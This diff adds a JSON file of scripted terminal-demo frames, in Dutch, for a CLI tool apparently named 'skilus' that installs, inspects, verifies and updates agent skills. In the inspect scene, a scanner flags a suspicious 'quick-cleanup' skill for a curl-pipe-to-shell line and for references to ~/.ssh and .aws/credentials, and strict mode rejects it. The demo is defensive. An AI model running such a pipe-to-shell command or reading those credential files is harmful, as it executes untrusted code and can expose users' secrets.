@@ -1,0 +1,354 @@
+{
+ "lang": "nl",
+ "cols": 76,
+ "scenes": [
+  {
+   "name": "add",
+   "steps": [
+    [
+     "cmd",
+     "skilus add anthropics/skills"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Welke skills wil je installeren?</span>",
+      "↑↓ verplaatsen · spatie aanvinken · → alle · ← geen · typ om te filteren ·…",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">academy-guide        </span>  <span class=\"d\">Stop and check this skill before finishing an…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">algorithmic-art      </span>  <span class=\"d\">Creating algorithmic art using p5.js with see…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">brand-guidelines     </span>  <span class=\"d\">Applies Anthropic&#x27;s official brand colors and…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">canvas-design        </span>  <span class=\"d\">Create beautiful visual art in .png and .pdf …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">claude-api           </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">discernment-nudge    </span>  <span class=\"d\">After you give a substantive answer or draft …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">doc-coauthoring      </span>  <span class=\"d\">Guide users through a structured workflow for…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">docx                 </span>  <span class=\"d\">Use this skill whenever the user wants to cre…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">frontend-design      </span>  <span class=\"d\">Guidance for distinctive, intentional visual …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">internal-comms       </span>  <span class=\"d\">A set of resources to help me write all kinds…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">mcp-builder          </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Co…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">pdf                  </span>  <span class=\"d\">Use this skill whenever the user wants to do …</span>",
+      "<span class=\"d\">  ↓ nog 7</span>",
+      "<span class=\"d\">  19 van 19 aangevinkt</span>"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Welke skills wil je installeren?</span>",
+      "↑↓ verplaatsen · spatie aanvinken · → alle · ← geen · typ om te filteren ·…",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">academy-guide        </span>  <span class=\"d\">Stop and check this skill before finishing an…</span>",
+      "  [ ] <span class=\"b\">algorithmic-art      </span>  <span class=\"d\">Creating algorithmic art using p5.js with see…</span>",
+      "  [ ] <span class=\"b\">brand-guidelines     </span>  <span class=\"d\">Applies Anthropic&#x27;s official brand colors and…</span>",
+      "  [ ] <span class=\"b\">canvas-design        </span>  <span class=\"d\">Create beautiful visual art in .png and .pdf …</span>",
+      "  [ ] <span class=\"b\">claude-api           </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK …</span>",
+      "  [ ] <span class=\"b\">discernment-nudge    </span>  <span class=\"d\">After you give a substantive answer or draft …</span>",
+      "  [ ] <span class=\"b\">doc-coauthoring      </span>  <span class=\"d\">Guide users through a structured workflow for…</span>",
+      "  [ ] <span class=\"b\">docx                 </span>  <span class=\"d\">Use this skill whenever the user wants to cre…</span>",
+      "  [ ] <span class=\"b\">frontend-design      </span>  <span class=\"d\">Guidance for distinctive, intentional visual …</span>",
+      "  [ ] <span class=\"b\">internal-comms       </span>  <span class=\"d\">A set of resources to help me write all kinds…</span>",
+      "  [ ] <span class=\"b\">mcp-builder          </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Co…</span>",
+      "  [ ] <span class=\"b\">pdf                  </span>  <span class=\"d\">Use this skill whenever the user wants to do …</span>",
+      "<span class=\"d\">  ↓ nog 7</span>",
+      "<span class=\"d\">  0 van 19 aangevinkt</span>"
+     ],
+     900
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Welke skills wil je installeren?</span>",
+      "↑↓ verplaatsen · spatie aanvinken · → alle · ← geen · typ om te filteren ·…",
+      "<span class=\"d\">Filter:</span> <span class=\"b\">p</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">claude-api    </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK — model…</span>",
+      "  [ ] <span class=\"b\">mcp-builder   </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Context P…</span>",
+      "  [ ] <span class=\"b\">pdf           </span>  <span class=\"d\">Use this skill whenever the user wants to do anythin…</span>",
+      "  [ ] <span class=\"b\">pptx          </span>  <span class=\"d\">Use this skill any time a .pptx or .potx file is inv…</span>",
+      "  [ ] <span class=\"b\">webapp-testing</span>  <span class=\"d\">Toolkit for interacting with and testing local web a…</span>",
+      "<span class=\"d\">  5 van 19 komen overeen · 0 aangevinkt</span>"
+     ],
+     450
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Welke skills wil je installeren?</span>",
+      "↑↓ verplaatsen · spatie aanvinken · → alle · ← geen · typ om te filteren ·…",
+      "<span class=\"d\">Filter:</span> <span class=\"b\">pd</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  1 van 19 komen overeen · 0 aangevinkt</span>"
+     ],
+     450
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Welke skills wil je installeren?</span>",
+      "↑↓ verplaatsen · spatie aanvinken · → alle · ← geen · typ om te filteren ·…",
+      "<span class=\"d\">Filter:</span> <span class=\"b\">pdf</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  1 van 19 komen overeen · 0 aangevinkt</span>"
+     ],
+     700
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Welke skills wil je installeren?</span>",
+      "↑↓ verplaatsen · spatie aanvinken · → alle · ← geen · typ om te filteren ·…",
+      "<span class=\"d\">Filter:</span> <span class=\"b\">pdf</span>",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  1 van 19 komen overeen · 1 aangevinkt</span>"
+     ],
+     900
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Welke skills wil je installeren?</span> pdf",
+      "<span class=\"b\">In welke agents?</span>",
+      "↑↓ verplaatsen · spatie aanvinken · → alle · ← geen · typ om te filteren ·…",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">Claude Code</span>  <span class=\"d\">.claude/skills</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">Codex      </span>  <span class=\"d\">.agents/skills</span>",
+      "  2 van 74 agents geïnstalleerd · gebruik --agent &lt;id&gt; voor de rest (lijst…"
+     ],
+     1600
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Welke skills wil je installeren?</span> pdf",
+      "<span class=\"b\">In welke agents?</span> Claude Code, Codex",
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 1 skill",
+      "",
+      "● <span class=\"b\">pdf</span>   <span class=\"d\">12 bestanden · 57 KiB · sha256 32cdced3a21a</span>",
+      "  Use this skill whenever the user wants to do anything with PDF files. This",
+      "  includes reading or extracting text/tables from PDFs, combining or mergin…",
+      "  <span class=\"y\">!</span> scripts/extract_form_structure.py: uitvoerbaar bestand; accepteer het",
+      "    met allow: [scripts] <span class=\"d\">[executable]</span>",
+      "",
+      "Doelen: .claude/skills (claude-code, copy) · .agents/skills (codex, copy)",
+      "1 skill · 0 blokkades · <span class=\"y\">1 waarschuwing</span>",
+      "Installeren? [j/N]"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Welke skills wil je installeren?</span> pdf",
+      "<span class=\"b\">In welke agents?</span> Claude Code, Codex",
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 1 skill",
+      "",
+      "● <span class=\"b\">pdf</span>   <span class=\"d\">12 bestanden · 57 KiB · sha256 32cdced3a21a</span>",
+      "  Use this skill whenever the user wants to do anything with PDF files. This",
+      "  includes reading or extracting text/tables from PDFs, combining or mergin…",
+      "  <span class=\"y\">!</span> scripts/extract_form_structure.py: uitvoerbaar bestand; accepteer het",
+      "    met allow: [scripts] <span class=\"d\">[executable]</span>",
+      "",
+      "Doelen: .claude/skills (claude-code, copy) · .agents/skills (codex, copy)",
+      "1 skill · 0 blokkades · <span class=\"y\">1 waarschuwing</span>",
+      "Installeren? [j/N] j",
+      "",
+      "pdf (32cdced3a21a) geïnstalleerd in 2 doelen."
+     ],
+     2600
+    ]
+   ]
+  },
+  {
+   "name": "inspect",
+   "steps": [
+    [
+     "cmd",
+     "skilus inspect ./downloads/quick-cleanup"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">downloads/quick-cleanup</span> · 1 skill",
+      "",
+      "● <span class=\"b\">quick-cleanup</span>   <span class=\"d\">2 bestanden · 298 B · sha256 27a5b9bedd30</span>",
+      "  Clears build caches and temporary files in the current project.",
+      "  <span class=\"y\">!</span> SKILL.md: noemt inloggegevens: ~/.ssh <span class=\"d\">[credential-access]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: uitvoerbaar bestand; accepteer het met allow:",
+      "    [scripts] <span class=\"d\">[executable]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: downloadt en voert code uit: curl -fsSL",
+      "    https://get.example.dev/setup.sh | sh <span class=\"d\">[pipe-to-shell]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: noemt inloggegevens: .aws/credentials",
+      "    <span class=\"d\">[credential-access]</span>",
+      "",
+      "1 skill · 0 blokkades · <span class=\"y\">4 waarschuwingen</span>"
+     ],
+     2600
+    ],
+    [
+     "clear"
+    ],
+    [
+     "cmd",
+     "skilus add ./downloads/quick-cleanup --strict -y"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">./downloads/quick-cleanup</span> · 1 skill",
+      "",
+      "● <span class=\"b\">quick-cleanup</span>   <span class=\"d\">2 bestanden · 298 B · sha256 27a5b9bedd30</span>",
+      "  Clears build caches and temporary files in the current project.",
+      "  <span class=\"y\">!</span> SKILL.md: noemt inloggegevens: ~/.ssh <span class=\"d\">[credential-access]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: uitvoerbaar bestand; accepteer het met allow:",
+      "    [scripts] <span class=\"d\">[executable]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: downloadt en voert code uit: curl -fsSL",
+      "    https://get.example.dev/setup.sh | sh <span class=\"d\">[pipe-to-shell]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: noemt inloggegevens: .aws/credentials",
+      "    <span class=\"d\">[credential-access]</span>",
+      "",
+      "Doelen: .claude/skills (claude-code, copy) · .agents/skills (codex, copy)",
+      "1 skill · 0 blokkades · <span class=\"y\">4 waarschuwingen</span>",
+      "skilus: quick-cleanup: 4 waarschuwingen met --strict: afgewezen door de inspectie"
+     ],
+     600
+    ],
+    [
+     "cmd",
+     "echo $?"
+    ],
+    [
+     "frame",
+     [
+      "5"
+     ],
+     3000
+    ]
+   ]
+  },
+  {
+   "name": "verify",
+   "steps": [
+    [
+     "cmd",
+     "echo \"# tweak\" >> .claude/skills/pdf/SKILL.md"
+    ],
+    [
+     "frame",
+     [],
+     600
+    ],
+    [
+     "cmd",
+     "skilus verify"
+    ],
+    [
+     "frame",
+     [
+      "GEWIJZIGD pdf (project, claude-code) in ~/acme-app/.claude/skills/pdf",
+      "  gewijzigd: SKILL.md",
+      "Voer skilus sync uit om ze te herstellen (met --force als je ze met de hand hebt gewijzigd)."
+     ],
+     600
+    ],
+    [
+     "cmd",
+     "echo $?"
+    ],
+    [
+     "frame",
+     [
+      "6"
+     ],
+     1200
+    ],
+    [
+     "cmd",
+     "skilus sync --force"
+    ],
+    [
+     "frame",
+     [
+      "pdf vervangen in ~/acme-app/.claude/skills/pdf",
+      "Gesynchroniseerd: 0 geïnstalleerd, 1 vervangen, 5 ongewijzigd."
+     ],
+     900
+    ],
+    [
+     "cmd",
+     "skilus verify"
+    ],
+    [
+     "frame",
+     [
+      "Alles in orde: 3 skill(s) in 6 doel(en) komen overeen met de lock."
+     ],
+     3000
+    ]
+   ]
+  },
+  {
+   "name": "update",
+   "steps": [
+    [
+     "cmd",
+     "skilus update --check"
+    ],
+    [
+     "frame",
+     [
+      "SKILL      BEREIK   REF                GEÏNSTALLEERD  NIEUWSTE      STATUS",
+      "changelog  project  (standaardbranch)  9563a12b25b5   1b288cd0c1c1  nieuwe versie beschikbaar",
+      "pdf        project  (standaardbranch)  dbd4588f9e10   dbd4588f9e10  bijgewerkt",
+      "review     project  (standaardbranch)  9563a12b25b5   1b288cd0c1c1  nieuwe versie beschikbaar"
+     ],
+     1800
+    ],
+    [
+     "cmd",
+     "skilus update review"
+    ],
+    [
+     "frame",
+     [
+      "● <span class=\"b\">review</span>   <span class=\"d\">9563a12b25b5 → 1b288cd0c1c1 · sha256 3a46a113926d → 1c92660a3b6f</span>",
+      "  <span class=\"y\">~</span> SKILL.md",
+      "  <span class=\"g\">✓</span> geen bevindingen",
+      "",
+      "1 skill · 0 blokkades · 0 waarschuwingen",
+      "Bijwerken? [j/N]"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "● <span class=\"b\">review</span>   <span class=\"d\">9563a12b25b5 → 1b288cd0c1c1 · sha256 3a46a113926d → 1c92660a3b6f</span>",
+      "  <span class=\"y\">~</span> SKILL.md",
+      "  <span class=\"g\">✓</span> geen bevindingen",
+      "",
+      "1 skill · 0 blokkades · 0 waarschuwingen",
+      "Bijwerken? [j/N] j",
+      "",
+      "review bijgewerkt naar 1b288cd0c1c1 (1c92660a3b6f)."
+     ],
+     3200
+    ]
+   ]
+  }
+ ]
+}
